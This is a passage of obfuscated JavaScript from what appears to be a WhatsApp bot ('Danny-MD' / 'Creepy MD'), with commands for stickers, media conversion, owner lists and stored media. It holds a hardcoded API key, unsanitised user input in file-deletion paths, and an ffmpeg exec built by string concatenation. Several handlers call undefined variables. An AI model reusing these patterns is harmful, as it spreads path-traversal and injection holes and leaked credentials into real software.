          respon = ("\nCreept Response Speed " + _0x1f0999.toFixed(0x4) + " _Second_ \n " + (oldd - neww) + " _miliseconds_\n\nRuntime : " + runtime(process.uptime()) + "\n\n💻 Info Server\nRAM: " + formatp(os.totalmem() - os.freemem()) + " / " + formatp(os.totalmem()) + "\n\n_NodeJS Memory Usaage_\n" + Object.keys(_0x51afe8).map((_0x751419, _0x1b2877, _0x399549) => _0x751419.padEnd(Math.max(..._0x399549.map(_0x197ca5 => _0x197ca5.length)), " ") + ": " + formatp(_0x51afe8[_0x751419])).join("\n") + "\n\n" + (_0x3c2d62[0x0] ? "_Total CPU Usage_\n" + _0x3c2d62[0x0].model.trim() + " (" + _0xaaeaae.speed + " MHZ)\n" + Object.keys(_0xaaeaae.times).map(_0x1d7ac8 => "- *" + (_0x1d7ac8 + '*').padEnd(0x6) + ": " + (0x64 * _0xaaeaae.times[_0x1d7ac8] / _0xaaeaae.total).toFixed(0x2) + '%').join("\n") + "\n_CPU Core(s) Usage (" + _0x3c2d62.length + " Core CPU)_\n" + _0x3c2d62.map((_0x15b651, _0x1639e2) => _0x1639e2 + 0x1 + ". " + _0x15b651.model.trim() + " (" + _0x15b651.speed + " MHZ)\n" + Object.keys(_0x15b651.times).map(_0x1064da => "- *" + (_0x1064da + '*').padEnd(0x6) + ": " + (0x64 * _0x15b651.times[_0x1064da] / _0x15b651.total).toFixed(0x2) + '%').join("\n")).join("\n\n") : '') + "\n").trim();
          await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'text': respon,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "Danny-MD",
                'body': _0x1f0999.toFixed(0x4) + " Second",
                'thumbnailUrl': 'https://imgur.com/a/AApdZU4.jpeg',
                'sourceUrl': global.link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case "buypremium":
      case 'buyprem':
      case "premium":
        {
          let _0x12719e = "Hi " + _0x1d4e1b + "👋\nCreepy premium is free put your number in premium json in file";
          await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'text': _0x12719e,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': '' + botname,
                'body': '' + ownername,
                'thumbnailUrl': "https://imgur.com/a/AApdZU4.jpeg",
                'sourceUrl': global.link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case "runtime":
        let _0x3c58fc = "creepy Have Been Running For " + runtime(process.uptime());
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'text': _0x3c58fc,
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': "CREEPY_MD",
              'body': "FORGET DONATE",
              'thumbnailUrl': "https://imgur.com/a/AApdZU4.jpeg",
              'sourceUrl': global.link,
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case 'sc':
      case "script":
      case "repo":
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'text': "Helllo it's Danny",
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': "Search on yt Creepy_technology",
              'body': "YT Creepy_technology",
              'thumbnailUrl': "https://imgur.com/a/AApdZU4.jpeg",
              'sourceUrl': global.link,
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case "donate":
      case 'donasi':
        let _0x197389 = "Hello Brother " + _0x1d4e1b + "\n\nNo matter how much you donate is very valuable for us";
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'text': "Payment: https://wa.me/message/6Q3LU4DM2QVSB1\n\n" + _0x197389
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case "owner":
        {
          const _0x3c1c66 = await _0x2126c8.sendMessage(_0x496a83, {
            'contacts': {
              'displayName': _0x27123e.length + " Contact",
              'contacts': _0x27123e
            },
            'mentions': [_0x5454c7]
          }, {
            'quoted': _0x5cfbb1
          });
          _0x2126c8.sendMessage(_0x496a83, {
            'text': "Hello @" + _0x5454c7.split('@')[0x0] + ", Just chat with my owner he ia cool😎🫡",
            'mentions': [_0x5454c7]
          }, {
            'quoted': _0x3c1c66
          });
        }
        break;
      case "sticker":
      case "stiker":
      case 's':
        {
          if (!_0x1ea160) {
            return _0x36440f("Reply to Video/Image With Caption " + (_0x2507cf + _0x5ebe26));
          }
          if (/image/.test(_0x455bd4)) {
            let _0x575eb8 = await _0x1ea160.download();
            let _0x515abb = await _0x2126c8.sendImageAsSticker(_0x5cfbb1.chat, _0x575eb8, _0x5cfbb1, {
              'packname': packname,
              'author': author
            });
            await fs.unlinkSync(_0x515abb);
          } else {
            if (_0x33529b || /video/.test(_0x455bd4)) {
              if ((_0x1ea160.msg || _0x1ea160).seconds > 0xb) {
                return _0x36440f("Maximum 10 seconds!");
              }
              let _0x46722b = await _0x1ea160.download();
              let _0x527e95 = await _0x2126c8.sendVideoAsSticker(_0x5cfbb1.chat, _0x46722b, _0x5cfbb1, {
                'packname': packname,
                'author': author
              });
              await fs.unlinkSync(_0x527e95);
            } else {
              return _0x36440f("Send Images/Videos With Captions " + (_0x2507cf + _0x5ebe26) + "\nVideo Duration 1-9 Seconds");
            }
          }
        }
        break;
      case "smeme":
        {
          let _0x458591 = "Send/Reply image/sticker with caption " + (_0x2507cf + _0x5ebe26) + " text1|text2";
          if (!/image/.test(_0x455bd4)) {
            return _0x36440f(_0x458591);
          }
          if (!_0x5a4036) {
            return _0x36440f(_0x458591);
          }
          _0x36440f(mess.wait);
          atas = _0x5a4036.split('|')[0x0] ? _0x5a4036.split('|')[0x0] : '-';
          bawah = _0x5a4036.split('|')[0x1] ? _0x5a4036.split('|')[0x1] : '-';
          let _0x230c4f = await _0x2126c8.downloadAndSaveMediaMessage(_0x584091);
          let _0x256ccf = await TelegraPh(_0x230c4f);
          let _0x2a282c = "https://api.memegen.link/images/custom/" + encodeURIComponent(bawah) + '/' + encodeURIComponent(atas) + ".png?background=" + _0x256ccf;
          let _0x35fe35 = await _0x2126c8.sendImageAsSticker(_0x5cfbb1.chat, _0x2a282c, _0x5cfbb1, {
            'packname': packname,
            'author': author
          });
          fs.unlinkSync(_0x35fe35);
        }
        break;
      case "swm":
      case "steal":
      case 'stickerwm':
      case "take":
        {
          if (!_0x4f8c4e.join(" ")) {
            return _0x36440f("Where is the text?");
          }
          if (_0x5cfbb1.quoted.isAnimated === true) {
            _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160, "gifee");
            _0x2126c8.sendMessage(_0x496a83, {
              'sticker': fs.readFileSync("gifee.webp")
            }, {
              'quoted': _0x5cfbb1
            });
          } else {
            if (/image/.test(_0x455bd4)) {} else {
              if (/video/.test(_0x455bd4)) {
                if ((_0x1ea160.msg || _0x1ea160).seconds > 0xb) {
                  return _0x36440f("Maximum 10 Seconds!");
                }
              } else {
                _0x36440f("Photo/Video?");
              }
            }
          }
        }
        break;
      case "toimage":
      case 'toimg':
        {
          if (!/webp/.test(_0x455bd4)) {
            return _0x36440f("Reply sticker with caption *" + (_0x2507cf + _0x5ebe26) + '*');
          }
          _0x36440f(mess.wait);
          let _0x1ad753 = await _0x2126c8.downloadAndSaveMediaMessage(_0x584091);
          let _0x16f1dd = await getRandom(".png");
          exec("ffmpeg -i " + _0x1ad753 + " " + _0x16f1dd, _0x119f7c => {
            fs.unlinkSync(_0x1ad753);
            if (_0x119f7c) {
              return _0x119f7c;
            }
            let _0x5ef226 = fs.readFileSync(_0x16f1dd);
            _0x2126c8.sendMessage(_0x5cfbb1.chat, {
              'image': _0x5ef226
            }, {
              'quoted': _0x5cfbb1
            });
            fs.unlinkSync(_0x16f1dd);
          });
        }
        break;
      case "tomp4":
      case 'tovideo':
        {
          if (!/webp/.test(_0x455bd4)) {
            return _0x36440f("Reply sticker with caption *" + (_0x2507cf + _0x5ebe26) + '*');
          }
          _0x36440f(mess.wait);
          let _0x344018 = await _0x2126c8.downloadAndSaveMediaMessage(_0x584091);
          let _0x293411 = await webp2mp4File(_0x344018);
          await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'video': {
              'url': _0x293411.result,
              'caption': "Convert Webp To Video"
            }
          }, {
            'quoted': _0x5cfbb1
          });
          await fs.unlinkSync(_0x344018);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(_0x455bd4) && !/audio/.test(_0x455bd4)) {
            return _0x36440f("Send/Reply Video/Audio that you want to make into audio with caption " + (_0x2507cf + _0x5ebe26));
          }
          _0x36440f(mess.wait);
          let _0x2c0202 = await _0x2126c8.downloadMediaMessage(_0x584091);
          let _0x2f9b88 = await toAudio(_0x2c0202, "mp4");
          _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'audio': _0x2f9b88,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case "tomp3":
        {
          if (!/video/.test(_0x455bd4) && !/audio/.test(_0x455bd4)) {
            return _0x36440f("Send/Reply Video/Audio that you want to make into MP3 with caption " + (_0x2507cf + _0x5ebe26));
          }
          _0x36440f(mess.wait);
          let _0x7efb60 = await _0x2126c8.downloadMediaMessage(_0x584091);
          let _0x146cdd = await toAudio(_0x7efb60, "mp4");
          _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'document': _0x146cdd,
            'mimetype': "audio/mp3",
            'fileName': "dgxeon.mp3"
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(_0x455bd4) && !/audio/.test(_0x455bd4)) {
            return _0x36440f("Reply Video/Audio that you want to make into a VN with caption " + (_0x2507cf + _0x5ebe26));
          }
          _0x36440f(mess.wait);
          let _0x2bfec2 = await _0x2126c8.downloadMediaMessage(_0x584091);
          let {
            toPTT: _0x564b98
          } = require("./lib/converter");
          let _0x2f12af = await _0x564b98(_0x2bfec2, "mp4");
          _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'audio': _0x2f12af,
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case "togif":
        {
          if (!/webp/.test(_0x455bd4)) {
            return _0x36440f("Reply sticker with caption *" + (_0x2507cf + _0x5ebe26) + '*');
          }
          _0x36440f(mess.wait);
          let _0x275564 = await _0x2126c8.downloadAndSaveMediaMessage(_0x584091);
          let _0x49b683 = await webp2mp4File(_0x275564);
          await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'video': {
              'url': _0x49b683.result,
              'caption': "Convert Webp To Video"
            },
            'gifPlayback': true
          }, {
            'quoted': _0x5cfbb1
          });
          await fs.unlinkSync(_0x275564);
        }
        break;
      case "tourl":
        {
          _0x36440f(mess.wait);
          let _0x53c1ad = await _0x2126c8.downloadAndSaveMediaMessage(_0x584091);
          if (/image/.test(_0x455bd4)) {
            let _0x5bc2df = await TelegraPh(_0x53c1ad);
            _0x36440f(util.format(_0x5bc2df));
          } else {
            if (!/image/.test(_0x455bd4)) {
              let _0x12f214 = await UploadFileUgu(_0x53c1ad);
              _0x36440f(util.format(_0x12f214));
            }
          }
          await fs.unlinkSync(_0x53c1ad);
        }
        break;
      case "emojimix":
        {
          let [_0x46c270, _0x182969] = _0x5a4036.split`+`;
          if (!_0x46c270) {
            return _0x36440f("Example : " + (_0x2507cf + _0x5ebe26) + " 😅+🤔");
          }
          if (!_0x182969) {
            return _0x36440f("Example : " + (_0x2507cf + _0x5ebe26) + " 😅+🤔");
          }
          _0x36440f(mess.wait);
          let _0x229d4e = await fetchJson("https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=" + encodeURIComponent(_0x46c270) + '_' + encodeURIComponent(_0x182969));
          for (let _0x47d3ab of _0x229d4e.results) {
            let _0x42584e = await _0x2126c8.sendImageAsSticker(_0x5cfbb1.chat, _0x47d3ab.url, _0x5cfbb1, {
              'packname': global.packname,
              'author': global.author,
              'categories': _0x47d3ab.tags
            });
            await fs.unlinkSync(_0x42584e);
          }
        }
        break;
      case "toonce":
      case "toviewonce":
        {
          if (!_0x1ea160) {
            return _0x36440f("Reply Image/Video");
          }
          if (/image/.test(_0x455bd4)) {
            anuan = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
            _0x2126c8.sendMessage(_0x5cfbb1.chat, {
              'image': {
                'url': anuan
              },
              'caption': "Here you go!",
              'fileLength': "999",
              'viewOnce': true
            }, {
              'quoted': _0x5cfbb1
            });
          } else if (/video/.test(_0x455bd4)) {
            anuanuan = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
            _0x2126c8.sendMessage(_0x5cfbb1.chat, {
              'video': {
                'url': anuanuan
              },
              'caption': "Here you go!",
              'fileLength': "99999999",
              'viewOnce': true
            }, {
              'quoted': _0x5cfbb1
            });
          }
        }
        break;
      case "toqr":
        {
          if (!q) {
            return _0x36440f(" Please include link or text!");
          }
          const _0x4a9297 = require("qrcode");
          let _0xaa2b54 = await _0x4a9297.toDataURL(q, {
            'scale': 0x23
          });
          let _0x21de15 = new Buffer.from(_0xaa2b54.replace("data:image/png;base64,", ''), 'base64');
          let _0x4216fc = getRandom('.jpg');
          await fs.writeFileSync('./' + _0x4216fc, _0x21de15);
          let _0x179a11 = fs.readFileSync('./' + _0x4216fc);
          await _0x2126c8.sendMessage(_0x496a83, {
            'image': _0x179a11,
            'caption': "Here you go!"
          }, {
            'quoted': _0x5cfbb1
          });
          setTimeout(() => {
            fs.unlinkSync(_0x4216fc);
          }, 0x2710);
        }
        break;
      case 'fliptext':
        {
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Example:\n" + _0x2507cf + "fliptext Xeony");
          }
          quere = _0x4f8c4e.join(" ");
          flipe = quere.split('').reverse().join('');
          _0x36440f("```「 FLIP TEXT 」```\n*•> Normal :*\n" + quere + "\n*•> Flip :*\n" + flipe);
        }
        break;
      case "listvn":
        {
          let _0xda8a6a = "┌──⭓「 *List Vn* 」\n│\n";
          for (let _0x35c57a of VoiceNoteXeon) {
            _0xda8a6a += "│⭔ " + _0x35c57a + "\n";
          }
          _0xda8a6a += "│\n└────────────⭓\n\n*Total : " + VoiceNoteXeon.length + '*';
          _0x36440f(_0xda8a6a);
        }
        break;
      case 'liststicker':
        {
          let _0x551f0 = "┌──⭓「 *List Sticker* 」\n│\n";
          for (let _0x1e1984 of StickerXeon) {
            _0x551f0 += "│⭔ " + _0x1e1984 + "\n";
          }
          _0x551f0 += "│\n└────────────⭓\n\n*Total : " + StickerXeon.length + '*';
          _0x36440f(_0x551f0);
        }
        break;
      case "listimage":
        {
          let _0x113317 = "┌──⭓「 *List Image* 」\n│\n";
          for (let _0x205442 of ImageXeon) {
            _0x113317 += "│⭔ " + _0x205442 + "\n";
          }
          _0x113317 += "│\n└────────────⭓\n\n*Total : " + ImageXeon.length + '*';
          _0x36440f(_0x113317);
        }
        break;
      case "listvideo":
        {
          let _0x5d2f78 = "┌──⭓「 *List Video* 」\n│\n";
          for (let _0x6706dc of VideoXeon) {
            _0x5d2f78 += "│⭔ " + _0x6706dc + "\n";
          }
          _0x5d2f78 += "│\n└────────────⭓\n\n*Total : " + VideoXeon.length + '*';
          _0x36440f(_0x5d2f78);
        }
        break;
      case 'addowner':
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (!_0x4f8c4e[0x0]) {
          return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " number\nExample " + (_0x2507cf + _0x5ebe26) + " " + ownernumber);
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x2e21d1 = await _0x2126c8.onWhatsApp(bnnd);
        if (_0x2e21d1.length == 0x0) {
          return _0x36440f("Enter A Valid And Registered Number On WhatsApp!!!");
        }
        owner.push(bnnd);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        _0x36440f("Number " + bnnd + " Has Become An Owner!!!");
        break;
      case "delowner":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (!_0x4f8c4e[0x0]) {
          return _0x36440f("Use " + (_0x2507cf + _0x5ebe26) + " nomor\nExample " + (_0x2507cf + _0x5ebe26) + " 255697608274");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = owner.indexOf(ya);
        owner.splice(unp, 0x1);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        _0x36440f("The Numbrr " + ya + " Has been deleted from owner list by the creepy!!!");
        break;
      case "addvideo":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Video Name?");
          }
          if (VideoXeon.includes(q)) {
            return _0x36440f("The name you entered already exists");
          }
          let _0x2224e9 = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
          VideoXeon.push(q);
          await fsx.copy(_0x2224e9, "./XeonMedia/video/" + q + ".mp4");
          fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon));
          fs.unlinkSync(_0x2224e9);
          _0x36440f("Success Adding VideoTo View Type " + _0x2507cf + 'listvideo');
        }
        break;
      case 'delvideo':
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the Video Name");
          }
          if (!VideoXeon.includes(q)) {
            return _0x36440f("Name Does Not Exist in Database");
          }
          let _0x586a27 = VideoXeon.indexOf(q);
          VideoXeon.splice(_0x586a27, 0x1);
          fs.writeFileSync("./database/autoreply/video.json", JSON.stringify(VideoXeon));
          fs.unlinkSync('./XeonMedia/video/' + q + ".mp4");
          _0x36440f("Successfully Deleted Video " + q);
        }
        break;
      case "addimage":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("The name of the image?");
          }
          if (ImageXeon.includes(q)) {
            return _0x36440f("The name you entered is already registered in the database");
          }
          let _0x125c7a = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
          ImageXeon.push(q);
          await fsx.copy(_0x125c7a, './XeonMedia/image/' + q + '.jpg');
          fs.writeFileSync("./database/autoreply/image.json", JSON.stringify(ImageXeon));
          fs.unlinkSync(_0x125c7a);
          _0x36440f("Success In Adding Image\nTo Check Type " + _0x2507cf + 'listimage');
        }
        break;
      case "delimage":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the Image Name");
          }
          if (!ImageXeon.includes(q)) {
            return _0x36440f("The image name you entered is not registered");
          }
          let _0x12212e = ImageXeon.indexOf(q);
          ImageXeon.splice(_0x12212e, 0x1);
          fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon));
          fs.unlinkSync('./XeonMedia/image/' + q + ".jpg");
          _0x36440f("Successfully Deleted Image " + q);
        }
        break;
      case "addsticker":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the name of the sticker?");
          }
          if (StickerXeon.includes(q)) {
            return _0x36440f("Name Already In Use");
          }
          let _0x53d49c = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
          StickerXeon.push(q);
          await fsx.copy(_0x53d49c, "./XeonMedia/sticker/" + q + ".webp");
          fs.writeFileSync("./database/autoreply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync(_0x53d49c);
          _0x36440f("Successfully Adding StickerTo Check Type " + _0x2507cf + "liststicker");
        }
        break;
      case "delsticker":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the name of the sticker");
          }
          if (!StickerXeon.includes(q)) {
            return _0x36440f("Name Not Registered in Database");
          }
          let _0x4e763f = StickerXeon.indexOf(q);
          StickerXeonBotInc.splice(_0x4e763f, 0x1);
          fs.writeFileSync("./database/autoreply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync("./XeonMedia/sticker/" + q + ".webp");
          _0x36440f("Successfully Removed Sticker " + q);
        }
        break;
      case 'addvn':
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the Name?");
          }
          if (VoiceNoteXeon.includes(q)) {
            return _0x36440f("Name Already In Use");
          }
          let _0x582d2e = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
          VoiceNoteXeon.push(q);
          await fsx.copy(_0x582d2e, "./XeonMedia/audio/" + q + ".mp3");
          fs.writeFileSync("./database/autoreply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync(_0x582d2e);
          _0x36440f("Success Adding Audio\nTo Check Type " + _0x2507cf + 'listvn');
        }
        break;
      case "delvn":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the Name");
          }
          if (!VoiceNoteXeon.includes(q)) {
            return _0x36440f("Name Not Registered in Database");
          }
          let _0x26664d = VoiceNoteXeon.indexOf(q);
          VoiceNoteXeon.splice(_0x26664d, 0x1);
          fs.writeFileSync("./database/autoreply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync('./XeonMedia/audio/' + q + ".mp3");
          _0x36440f("Successfully Deleted Audio " + q);
        }
        break;
      case "addzip":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          await _0x54ca09();
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("What's the zip name?");
          }
          let _0x5c1b43 = '' + _0x5a4036;
          {
            if (ZipXeon.includes(_0x5c1b43)) {
              return _0x36440f("This name is already in use");
            }
            let _0x54d9c1 = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
            ZipXeon.push(_0x5c1b43);
            await fsx.copy(_0x54d9c1, "./XeonMedia/zip/" + _0x5c1b43 + ".zip");
            fs.writeFileSync("./database/autoreply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync(_0x54d9c1);
            _0x36440f("Success Adding zip\nTo check type " + _0x2507cf + "listzip");
          }
        }
        break;
      case "delzip":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          await _0x54ca09();
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the text in the zip list");
          }
          let _0x3de518 = '' + _0x5a4036;
          {
            if (!ZipXeon.includes(_0x3de518)) {
              return _0x36440f("This name does not exist in the database");
            }
            let _0x5b4cd4 = ZipXeon.indexOf(_0x3de518);
            ZipXeon.splice(_0x5b4cd4, 0x1);
            fs.writeFileSync("./database/autoreply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync("./XeonMedia/zip/" + _0x3de518 + '.zip');
            _0x36440f("Successfully deleted zip " + _0x3de518);
          }
        }
        break;
      case "listzip":
        {
          await _0x54ca09();
          let _0x1e4640 = "┌──⭓「 *ZIP LIST BY CREEPY* 」\n│\n";
          for (let _0x241660 of ZipXeon) {
            _0x1e4640 += "│⭔ " + _0x241660 + "\n";
          }
          _0x1e4640 += "│\n└────────────⭓\n\n*Total : " + ZipXeon.length + '*';
          _0x36440f(_0x1e4640);
        }
        break;
      case "addapk":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          await _0x54ca09();
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("What is the name of the apk?");
          }
          let _0x2b83fb = '' + _0x5a4036;
          {
            if (ApkXeon.includes(_0x2b83fb)) {
              return _0x36440f("This name is already in use");
            }
            let _0x354f81 = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
            apknye.push(_0x2b83fb);
            await fsx.copy(_0x354f81, "./XeonMedia/apk/" + _0x2b83fb + ".apk");
            fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon));
            fs.unlinkSync(_0x354f81);
            _0x36440f("Successful Adding apk\nTo Check type " + _0x2507cf + "listapk");
          }
        }
        break;
      case "delapk":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          await _0x54ca09();
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Name of the apk?");
          }
          let _0x24db11 = '' + _0x5a4036;
          {
            if (!ApkXeon.includes(_0x24db11)) {
              return _0x36440f("This name does not exist in the database");
            }
            let _0x3ab551 = ApkXeon.indexOf(_0x24db11);
            ApkXeon.splice(_0x3ab551, 0x1);
            fs.writeFileSync("./database/autoreply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync("./XeonMedia/apk/" + _0x24db11 + '.apk');
            _0x36440f("Successfully deleted Apk " + _0x24db11);
          }
        }
        break;
      case "listapk":
        {
          await _0x54ca09();
          let _0x4df69d = "┌──⭓「 *APK LIST BY CREEPY* 」\n│\n";
          for (let _0x5f592b of ApkXeon) {
            _0x4df69d += "│⭔ " + _0x5f592b + "\n";
          }
          _0x4df69d += "│\n└────────────⭓\n\n*Total : " + ApkXeon.length;
          _0x36440f(_0x4df69d);
        }
        break;
      case "addpdf":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          await _0x54ca09();
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("What is the name of the pdf");
          }
          let _0x38fdcd = '' + _0x5a4036;
          {
            if (DocXeon.includes(_0x38fdcd)) {
              return _0x36440f("This name is already in use");
            }
            let _0xe3be4b = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160);
            docunye.push(_0x38fdcd);
            await fsx.copy(_0xe3be4b, './XeonMedia/doc/' + _0x38fdcd + ".pdf");
            fs.writeFileSync("./database/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync(_0xe3be4b);
            _0x36440f("Successful Adding Pdf\nTo check type " + _0x2507cf + "listpdf");
          }
        }
        break;
      case "delpdf":
        {
          if (!_0x573dd7) {
            return _0x36440f(mess.prem);
          }
          await _0x54ca09();
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("Enter the name");
          }
          let _0x5788e2 = '' + _0x5a4036;
          {
            if (!DocXeon.includes(_0x5788e2)) {
              return _0x36440f("This name does not exist in the database");
            }
            let _0x3dea59 = DocApk.indexOf(_0x5788e2);
            docunye.splice(_0x3dea59, 0x1);
            fs.writeFileSync("./database/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync("./XeonMedia/doc/" + _0x5788e2 + ".pdf");
            _0x36440f("Successfully deleted pdf " + _0x5788e2);
          }
        }
        break;
      case "listpdf":
        {
          await _0x54ca09();
          let _0x4382fa = "┌──⭓「 *PDF LIST BY CREEPY* 」\n│\n";
          for (let _0x401904 of docunye) {
            _0x4382fa += "│⭔ " + _0x401904 + "\n";
          }
          _0x4382fa += "│\n└────────────⭓\n\n*Total : " + docunye.length + '*';
          _0x36440f(_0x4382fa);
        }
        break;
      case "afk":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (_0x5ad5d7) {
          return _0x36440f("Already afk");
        }
        let _0x51eb97 = _0x5a4036 ? _0x5a4036 : "Nothing.";
        afk.addAfkUser(_0x5cfbb1.sender, Date.now(), _0x51eb97, _afk);
        _0x36440f('@' + _0x5cfbb1.sender.split('@')[0x0] + " Currently AFK\nWith reason : " + _0x51eb97);
        break;
      case "play":
      case "song":
        {
          if (!_0x5a4036) {
            return _0x36440f("Example : " + (_0x2507cf + _0x5ebe26) + " anime whatsapp status");
          }
          const _0x1279f1 = require("./lib/ytdl2");
          let _0x2bbeff = require("youtube-yts");
          let _0x45b9b3 = await _0x2bbeff(_0x5a4036);
          let _0x3f2382 = _0x45b9b3.videos[0x0];
          const _0x3ee361 = await _0x1279f1.mp3(_0x3f2382.url);
          await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'audio': fs.readFileSync(_0x3ee361.path),
            'fileName': _0x3f2382.title + ".mp3",
            'mimetype': "audio/mp4",
            'ptt': true,
            'contextInfo': {
              'externalAdReply': {
                'title': _0x3f2382.title,
                'body': botname,
                'thumbnail': await fetchBuffer(_0x3ee361.meta.image),
                'mediaType': 0x2,
                'mediaUrl': _0x3f2382.url
              }
            }
          }, {
            'quoted': _0x5cfbb1
          });
          await fs.unlinkSync(_0x3ee361.path);
        }
        break;
      case 'ytmp3':
      case "ytaudio":
        const _0x390e5b = require('./lib/ytdl2');
        if (_0x4f8c4e.length < 0x1 || !isUrl(_0x5a4036) || !_0x390e5b.isYTUrl(_0x5a4036)) {
          return _0x36440f("Where's the yt link?\nExample: " + (_0x2507cf + _0x5ebe26) + " https://youtube.com/shorts/dEipaIXnuiM?si=p6sfjwB4lcCCy20L");
        }
        const _0x290765 = await _0x390e5b.mp3(_0x5a4036);
        await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'audio': fs.readFileSync(_0x290765.path),
          'mimetype': "audio/mp4",
          'ptt': true,
          'contextInfo': {
            'externalAdReply': {
              'title': _0x290765.meta.title,
              'body': botname,
              'thumbnail': await fetchBuffer(_0x290765.meta.image),
              'mediaType': 0x2,
              'mediaUrl': _0x5a4036
            }
          }
        }, {
          'quoted': _0x5cfbb1
        });
        await fs.unlinkSync(_0x290765.path);
        break;
      case "ytmp4":
      case "ytvideo":
        {
          const _0x1b577c = require("./lib/ytdl2");
          if (_0x4f8c4e.length < 0x1 || !isUrl(_0x5a4036) || !_0x1b577c.isYTUrl(_0x5a4036)) {
